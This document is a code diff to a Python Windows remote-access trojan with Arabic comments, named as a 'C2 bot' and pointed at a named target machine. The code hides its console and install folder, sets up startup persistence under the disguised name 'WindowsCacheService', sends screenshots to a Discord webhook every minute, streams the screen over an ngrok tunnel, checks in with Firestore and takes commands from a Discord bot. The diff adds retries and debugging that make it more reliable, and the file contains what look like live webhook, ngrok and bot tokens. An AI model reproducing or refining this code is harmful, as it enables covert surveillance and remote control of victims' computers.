@@ -1,9 +1,8 @@
 # -*- coding: utf-8 -*-
 """
-الملف المدمج (سكرين شوت + بث ngrok + بوت C2)
-- يرسل صورة الشاشة إلى الويب هوك كل 60 ثانية
-- يشغّل خادم بث محلي + نفق ngrok ويرسل الرابط وكلمة المرور للديسكورد
-- يسجّل الجهاز في Firebase ويستقبل أوامر من بوت الديسكورد
+الملف المدمج (سكرين شوت + بث ngrok + بوت C2) - نسخة مُصلحة
+- سجل الأخطاء في: %TEMP%\wc_debug.log
+- خيارات: --debug (إظهار الكونسول) | --force (تجاوز الموتكس) | --always (تجاوز بوابة Firebase)
 """
 
 import os
@@ -19,6 +18,7 @@ import secrets
 import zipfile
 import threading
 import urllib.request
+import urllib.error
 import subprocess
 import winreg
 import platform
@@ -29,14 +29,19 @@ from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 DEBUG = ("--debug" in sys.argv) or (os.environ.get("WCDEBUG") == "1")
+FORCE = ("--force" in sys.argv) or (os.environ.get("WCFORCE") == "1")
+ALWAYS = ("--always" in sys.argv) or (os.environ.get("WCALWAYS") == "1")
 CREATE_NO_WINDOW = 0x08000000
 HIDDEN_ATTR = 0x2 | 0x4
 
 # ====== الإعدادات ======
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
+# روابط تحميل ngrok الصحيحة (bin.ngrok.com هو السيرفر الحالي)
 NGROK_DOWNLOAD_URLS = [
+    "https://bin.ngrok.com/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
     "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
+    "https://bin.equinox.io/a/bXcjjy4CoWK/ngrok-v3-3.16.0-windows-amd64.zip",
     "https://bin.equinox.io/a/cJk8dzafvmN/ngrok-v3-3.3.1-windows-amd64.zip",
 ]
 FIREBASE_BASE = "https://firestore.googleapis.com/v1/projects/database-c7f56/databases/(default)"
@@ -44,8 +49,8 @@ FIREBASE_STATUS_URL = FIREBASE_BASE + "/documents/users/app"
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
-SCREENSHOT_INTERVAL = 60    # إرسال صورة للديسكورد كل دقيقة
-CHECK_INTERVAL = 120        # فحص إرسال/تحديث رابط ngrok
+SCREENSHOT_INTERVAL = 60
+CHECK_INTERVAL = 120
 TARGET_NAME = "SK5X08-PC"
 
 # ====== إعدادات بوت الديسكورد (C2) ======
@@ -64,16 +69,21 @@ BASE_DIR = os.path.join(APPDATA, "Microsoft", "WindowsCache")
 NGROK_EXE = os.path.join(BASE_DIR, "ngrok.exe")
 DATA_FILE = os.path.join(BASE_DIR, "data.json")
 RUNNING_PATH = os.path.abspath(sys.argv[0])
+LOG_FILE = os.path.join(os.environ.get("TEMP", "."), "wc_debug.log")
 
-
+# ====== تسجيل الأخطاء في ملف دائم (مهم جداً للتشخيص) ======
 def log(msg):
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
+    except Exception:
+        pass
     if DEBUG:
         try:
             print(msg)
             sys.stdout.flush()
         except Exception:
             pass
-
 
 if DEBUG:
     try:
@@ -82,10 +92,9 @@ if DEBUG:
     except Exception:
         pass
     log("=" * 55)
-    log("[*] الملف المدمج - سكرين شوت + بث ngrok + بوت C2")
+    log("[*] الملف المدمج المُصلح - سكرين شوت + بث ngrok + بوت C2")
     log("=" * 55)
-
-if not DEBUG:
+else:
     try:
         console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
         if console_hwnd:
@@ -93,13 +102,15 @@ if not DEBUG:
     except Exception:
         pass
 
-try:
-    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-    if ctypes.windll.kernel32.GetLastError() == 183:
-        log("[!] المثيل يعمل مسبقاً - أغلق العملية القديمة أولاً")
-        sys.exit(0)
-except Exception:
-    pass
+# ====== الموتكس (مع خيار --force للتشخيص) ======
+if not FORCE:
+    try:
+        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
+        if ctypes.windll.kernel32.GetLastError() == 183:
+            log("[!] مثيل آخر يعمل مسبقاً (mutex) - اقتل العملية القديمة أو استخدم --force")
+            sys.exit(0)
+    except Exception:
+        pass
 
 # ====== أدوات مساعدة ======
 def hide_path(path):
@@ -112,7 +123,6 @@ def hide_path(path):
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except Exception:
             pass
-
 
 def find_pythonw():
     try:
@@ -127,14 +137,12 @@ def find_pythonw():
         pass
     return sys.executable
 
-
 def load_data():
     try:
         with open(DATA_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
     except Exception:
         return {}
-
 
 def save_data(data):
     try:
@@ -143,17 +151,23 @@ def save_data(data):
     except Exception:
         pass
 
-
-def send_discord_message(text):
-    try:
-        payload = json.dumps({"content": text}).encode("utf-8")
-        req = urllib.request.Request(WEBHOOK_URL, data=payload, method="POST",
-                                     headers={"Content-Type": "application/json",
-                                              "User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=15) as resp:
-            return resp.status == 200
-    except Exception:
-        return False
+def send_discord_message(text, retries=3):
+    for attempt in range(retries):
+        try:
+            payload = json.dumps({"content": text}).encode("utf-8")
+            req = urllib.request.Request(WEBHOOK_URL, data=payload, method="POST",
+                                         headers={"Content-Type": "application/json",
+                                                  "User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=15) as resp:
+                if resp.status == 200:
+                    return True
+                log(f"[!] الويبهوك رد بحالة {resp.status}")
+        except urllib.error.HTTPError as e:
+            log(f"[!] ويبهوك HTTPError {e.code} {e.reason} - تأكد إن الويبهوك ما انحذف!")
+        except Exception as e:
+            log(f"[!] فشل إرسال رسالة ديسكورد: {e}")
+        time.sleep(2)
+    return False
 
 # ====== Firebase ======
 def firestore_write(collection, doc_id, fields):
@@ -170,7 +184,6 @@ def firestore_write(collection, doc_id, fields):
         log(f"[!] فشل الكتابة في Firebase ({collection}/{doc_id}): {e}")
         return False
 
-
 def firestore_get_doc(collection, doc_id):
     try:
         req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}/{doc_id}",
@@ -180,7 +193,6 @@ def firestore_get_doc(collection, doc_id):
     except Exception:
         return None
 
-
 def firestore_list_docs(collection):
     try:
         req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}",
@@ -189,7 +201,6 @@ def firestore_list_docs(collection):
             return json.loads(r.read().decode("utf-8")).get("documents", [])
     except Exception:
         return []
-
 
 def fetch_firebase_field(field_name, default="on"):
     try:
@@ -205,7 +216,6 @@ def fetch_firebase_field(field_name, default="on"):
     except Exception:
         return default
 
-
 def is_this_owner():
     username = os.environ.get("USERNAME", "").strip().upper()
     if username == "HAMDI":
@@ -217,29 +227,31 @@ def is_this_owner():
         return True
     return False
 
-
 def should_send_screenshot():
+    if ALWAYS:
+        log("[*] وضع --always: الإرسال مفعّل دائماً")
+        return True
     if is_this_owner():
+        log("[*] جهاز المالك - الإرسال مفعّل")
         return True
     o = fetch_firebase_field("owner", "off")
     a = fetch_firebase_field("all", "off")
+    log(f"[*] بوابة Firebase: owner={o} all={a}")
     return o == "on" or a == "on"
-
 
 def ensure_pil():
     try:
         from PIL import Image, ImageDraw
         log("[+] Pillow متوفرة")
     except ImportError:
-        log("[*] فحص Pillow...")
+        log("[*] جاري تثبيت Pillow في الخلفية...")
         try:
             subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                             "--disable-pip-version-check", "Pillow"],
-                           timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                           timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             log("[+] تم تثبيت Pillow")
         except Exception as e:
             log(f"[!] فشل تثبيت Pillow: {e}")
-
 
 def get_device_id():
     try:
@@ -253,7 +265,6 @@ def get_device_id():
     except Exception:
         return "UNKNOWN"
 
-
 def ensure_persistence():
     try:
         if not os.path.exists(BASE_DIR):
@@ -261,14 +272,15 @@ def ensure_persistence():
         hide_path(BASE_DIR)
         if is_this_owner():
             return
-        copy_to = os.path.join(APPDATA, "Microsoft", "WindowsCache", "run.exe")
-        if not os.path.exists(copy_to):
+        copy_to = os.path.join(BASE_DIR, "run.pyw")
+        if (not os.path.exists(copy_to) and
+                os.path.abspath(sys.argv[0]).lower() != copy_to.lower()):
             shutil.copy(RUNNING_PATH, copy_to)
-        try:
-            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH) as key:
-                winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ, copy_to)
-        except Exception:
-            pass
+        pythonw = find_pythonw()
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH) as key:
+            winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
+                              f'"{pythonw}" "{copy_to}"')
+        log("[+] تم تثبيت الثبات (تشغيل عند بدء النظام)")
     except Exception as e:
         log(f"[!] فشل الثبات: {e}")
 
@@ -276,13 +288,17 @@ def ensure_persistence():
 def take_screenshot():
     try:
         from PIL import ImageGrab
-        screenshot = ImageGrab.grab()
+        img = ImageGrab.grab()
+        w, h = img.size
+        if w > 1920:
+            img = img.resize((1920, int(h * 1920 / w)))
         buf = io.BytesIO()
-        screenshot.save(buf, format="PNG")
+        img.save(buf, format="JPEG", quality=85)
         buf.seek(0)
         return buf
     except ImportError:
         pass
+    # بديل ctypes إذا Pillow غير متوفرة (BMP)
     try:
         user32 = ctypes.windll.user32
         gdi32 = ctypes.windll.gdi32
@@ -317,29 +333,35 @@ def take_screenshot():
     except Exception:
         return None
 
-
-def send_screenshot_to_discord(image_buffer):
-    try:
-        boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
-        body = (
-            f"--{boundary}\r\n".encode()
-            + b'Content-Disposition: form-data; name="file"; filename="screen.png"\r\n'
-            + b"Content-Type: image/png\r\n\r\n"
-            + image_buffer.getvalue()
-            + f"\r\n--{boundary}--\r\n".encode()
-        )
-        headers = {
-            "Content-Type": f"multipart/form-data; boundary={boundary}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        }
-        req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method="POST")
-        with urllib.request.urlopen(req, timeout=20) as resp:
-            return resp.status == 200
-    except Exception:
-        return False
-
+def send_screenshot_to_discord(image_buffer, retries=3):
+    for attempt in range(retries):
+        try:
+            boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
+            body = (
+                f"--{boundary}\r\n".encode()
+                + b'Content-Disposition: form-data; name="file"; filename="screen.jpg"\r\n'
+                + b"Content-Type: image/jpeg\r\n\r\n"
+                + image_buffer.getvalue()
+                + f"\r\n--{boundary}--\r\n".encode()
+            )
+            headers = {
+                "Content-Type": f"multipart/form-data; boundary={boundary}",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            }
+            req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method="POST")
+            with urllib.request.urlopen(req, timeout=25) as resp:
+                if resp.status == 200:
+                    return True
+                log(f"[!] رفع الصورة فشل بحالة {resp.status}")
+        except urllib.error.HTTPError as e:
+            log(f"[!] رفع الصورة HTTPError {e.code}")
+        except Exception as e:
+            log(f"[!] فشل رفع الصورة: {e}")
+        time.sleep(2)
+    return False
 
 def screenshot_loop():
+    first = True
     while True:
         try:
             if should_send_screenshot():
@@ -347,22 +369,25 @@ def screenshot_loop():
                 if img_buffer:
                     if send_screenshot_to_discord(img_buffer):
                         log("[+] تم إرسال لقطة شاشة للديسكورد")
-        except Exception:
-            pass
+        except Exception as e:
+            log(f"[!] خطأ في حلقة اللقطات: {e}")
+        if first:
+            first = False
         time.sleep(SCREENSHOT_INTERVAL)
 
 # ====== البث المباشر ======
 captured_frames = []
 frame_lock = threading.Lock()
 
-
 def capture_worker():
     global captured_frames
-    try:
-        from PIL import ImageGrab
-    except ImportError:
-        log("[!] Pillow غير متاح - لا يمكن التقاط الشاشة")
-        return
+    # انتظر حتى تتوفر Pillow (تثبيتها شغال في الخلفية)
+    while True:
+        try:
+            from PIL import ImageGrab
+            break
+        except ImportError:
+            time.sleep(3)
     while True:
         try:
             img = ImageGrab.grab()
@@ -375,7 +400,6 @@ def capture_worker():
         except Exception as e:
             log(f"[!] خطأ في التقاط الشاشة: {e}")
             time.sleep(1)
-
 
 def start_stream_server():
     try:
@@ -446,7 +470,6 @@ update();
     log(f"[+] خادم البث يعمل على http://127.0.0.1:{port}")
     return port
 
-
 def kill_existing_ngrok():
     try:
         subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"],
@@ -454,26 +477,24 @@ def kill_existing_ngrok():
     except Exception:
         pass
 
-
 def download_ngrok():
     for url in NGROK_DOWNLOAD_URLS:
         try:
-            log(f"[*] تحميل ngrok من {url}...")
+            log(f"[*] تحميل ngrok من {url}")
             zip_path = os.path.join(BASE_DIR, "ngrok.zip")
             urllib.request.urlretrieve(url, zip_path)
             with zipfile.ZipFile(zip_path, "r") as z:
                 z.extractall(BASE_DIR)
             os.remove(zip_path)
             if os.path.exists(NGROK_EXE):
-                log("[+] تم تحميل ngrok")
+                log("[+] تم تحميل ngrok بنجاح")
                 return True
-        except Exception:
-            pass
+        except Exception as e:
+            log(f"[!] فشل الرابط: {e}")
     return False
 
-
 def ensure_ngrok(port):
-    # 1) إذا كان نفق شغال مسبقاً نعيد رابطه مباشرة
+    # 1) نفق شغال مسبقاً؟ أرجع رابطه فوراً
     try:
         req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels",
                                      headers={'User-Agent': 'Mozilla/5.0'})
@@ -481,28 +502,50 @@ def ensure_ngrok(port):
             data = json.loads(r.read().decode())
             for t in data.get("tunnels", []):
                 if t.get("proto") == "https":
+                    log("[+] نفق ngrok موجود مسبقاً")
                     return t.get("public_url", "")
     except Exception:
         pass
-    # 2) تحميل ngrok إذا لم يكن موجوداً
+    # 2) تحميل ngrok إذا ما موجود
     if not os.path.exists(NGROK_EXE):
         if not download_ngrok():
+            log("[!] فشل تحميل ngrok من كل الروابط - تأكد من الإنترنت")
             return None
-    # 3) تشغيل النفق وقراءة الرابط
+    # 3) تشغيل النفق + سجل ngrok في ملف
+    ngrok_log = os.path.join(BASE_DIR, "ngrok.log")
     try:
         subprocess.Popen([NGROK_EXE, "http", str(port), "--authtoken", NGROK_TOKEN],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         stdout=open(ngrok_log, "a"), stderr=subprocess.STDOUT,
                          creationflags=CREATE_NO_WINDOW)
-        time.sleep(3)
-        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels",
-                                     headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=5) as r:
-            data = json.loads(r.read().decode())
-            for t in data.get("tunnels", []):
-                if t.get("proto") == "https":
-                    return t.get("public_url", "")
-    except Exception:
-        pass
+        log("[*] تم تشغيل ngrok - في انتظار النفق (حتى 30 ثانية)...")
+    except Exception as e:
+        log(f"[!] فشل تشغيل ngrok: {e}")
+        return None
+    # 4) انتظر النفق مع فحص سجل ngrok
+    for i in range(15):
+        time.sleep(2)
+        try:
+            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels",
+                                         headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                data = json.loads(r.read().decode())
+                for t in data.get("tunnels", []):
+                    if t.get("proto") == "https":
+                        url = t.get("public_url", "")
+                        log(f"[+] الرابط: {url}")
+                        return url
+        except Exception:
+            pass
+        try:
+            with open(ngrok_log, "r", errors="ignore") as f:
+                content = f.read().strip()
+            if content:
+                last_line = content.splitlines()[-1][:250]
+                if any(k in content.lower() for k in ["invalid", "unauthorized", "failed to connect", "authtoken"]):
+                    log(f"[!] ngrok يشتكي (غالباً التوكن): {last_line}")
+        except Exception:
+            pass
+    log("[!] انتهى الانتظار بدون نفق - شوف سجل ngrok.log في مجلد WindowsCache")
     return None
 
 # ====== معلومات الجهاز / نبض القلب ======
@@ -525,7 +568,6 @@ def get_total_ram_gb():
         except Exception:
             pass
         return "?"
-
 
 def heartbeat_loop():
     global DEVICE_ID
@@ -550,7 +592,6 @@ def heartbeat_loop():
         except Exception:
             pass
         time.sleep(30)
-
 
 def poll_commands_loop():
     global DEVICE_ID
@@ -598,17 +639,17 @@ def poll_commands_loop():
 
 # ====== بوت الديسكورد (C2) ======
 def start_bot():
-    if not BOT_TOKEN or BOT_TOKEN == "ضع_توكن_البوت_هنا":
+    if not BOT_TOKEN or BOT_TOKEN == "MTUzNDYyMTc1OTMyNjkxNjYwOQ.G2Jp_p.QL2LOyEPJxlFMHImHbykNImLrquzc1AK1FncfY":
         log("[!] ضع توكن البوت في المتغير BOT_TOKEN")
         return
     try:
         import discord
     except Exception:
-        log("[*] جاري تثبيت discord.py...")
+        log("[*] جاري تثبيت discord.py في الخلفية...")
         try:
             subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                             "--disable-pip-version-check", "discord.py"],
-                           timeout=300, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                           timeout=240, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             import discord
         except Exception as e:
             log(f"[!] فشل تثبيت discord.py: {e}")
@@ -825,32 +866,37 @@ def main_loop(port):
         save_data(data)
     last_sent = data.get("last_url", "")
     log(f"[*] كلمة المرور: {password}")
-    log("[*] في انتظار تشغيل النفق وإرسال رسالة الديسكورد...")
+    log("[*] بدء الحلقة: تشغيل النفق وإرسال الرابط...")
 
     while True:
         try:
             if should_send_screenshot():
                 url = ensure_ngrok(port)
-                if url and url != last_sent:
-                    msg = (
-                        f"تم كل شيء\n"
-                        f"الرابط: {url}/?key={password}\n"
-                        f"كلمة المرور: {password}\n"
-                        f"ملاحظة: إذا ظهرت صفحة تحذير ngrok اضغط (Visit Site) مرة وحدة"
-                    )
-                    if send_discord_message(msg):
-                        log("[+] تم إرسال الرابط وكلمة المرور للديسكورد")
-                        last_sent = url
-                        data["last_url"] = url
-                        save_data(data)
+                if url:
+                    if url != last_sent:
+                        msg = (
+                            f"تم كل شيء\n"
+                            f"الرابط: {url}/?key={password}\n"
+                            f"كلمة المرور: {password}\n"
+                            f"ملاحظة: إذا ظهرت صفحة تحذير ngrok اضغط (Visit Site) مرة وحدة"
+                        )
+                        if send_discord_message(msg):
+                            log("[+] تم إرسال الرابط وكلمة المرور للديسكورد")
+                            last_sent = url
+                            data["last_url"] = url
+                            save_data(data)
+                        else:
+                            log("[!] فشل إرسال رسالة الديسكورد (الرابط موجود لكن الويبهوك مشكلة)")
+                        try:
+                            firestore_write("devices", DEVICE_ID, {"stream_url": f"{url}/?key={password}"})
+                        except Exception:
+                            pass
                     else:
-                        log("[!] فشل إرسال رسالة الديسكورد")
-                    try:
-                        firestore_write("devices", DEVICE_ID, {"stream_url": f"{url}/?key={password}"})
-                    except Exception:
-                        pass
+                        log(f"[*] الرابط نفسه ما تغير، ما نرسل مرة ثانية: {url}")
+                else:
+                    log("[!] ما حصلنا رابط ngrok هذه الدورة - بنعيد المحاولة بعد دقيقتين")
             else:
-                log("[*] الإرسال معطل من Firebase (owner/all = off)")
+                log("[*] الإرسال معطل (owner/all = off) - استخدم --always للتجربة")
         except Exception as e:
             log(f"[!] خطأ في الحلقة: {e}")
         time.sleep(CHECK_INTERVAL)
@@ -861,7 +907,6 @@ def main():
     os.makedirs(BASE_DIR, exist_ok=True)
     hide_path(BASE_DIR)
     ensure_persistence()
-    ensure_pil()
     data = load_data()
     if not data.get("password"):
         data["password"] = secrets.token_urlsafe(8)
@@ -869,19 +914,19 @@ def main():
     DEVICE_ID = get_device_id()
     log(f"[+] معرف الجهاز: {DEVICE_ID}")
 
-    # خيوط الخلفية
+    # كل شي بطيء (تثبيت مكتبات، بوت) في خيوط حتى ما يوقف النفق
+    threading.Thread(target=ensure_pil, daemon=True).start()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=poll_commands_loop, daemon=True).start()
     threading.Thread(target=screenshot_loop, daemon=True).start()
+    threading.Thread(target=start_bot, daemon=True).start()
 
-    start_bot()
     kill_existing_ngrok()
     port = start_stream_server()
     threading.Thread(target=capture_worker, daemon=True).start()
     log(f"[+] خيط التقاط الشاشة يعمل ({STREAM_FPS} إطار/ثانية)")
 
     main_loop(port)
-
 
 if __name__ == "__main__":
     try:
